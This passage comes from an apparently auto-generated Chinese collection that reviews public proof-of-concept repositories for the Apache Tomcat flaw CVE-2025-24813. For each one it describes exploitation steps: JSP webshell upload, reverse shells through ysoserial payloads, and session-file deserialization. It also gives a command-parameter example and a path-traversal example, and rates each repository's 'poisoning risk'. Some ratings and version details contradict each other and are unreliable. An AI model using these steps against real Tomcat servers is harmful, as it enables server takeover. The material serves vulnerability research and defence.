根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
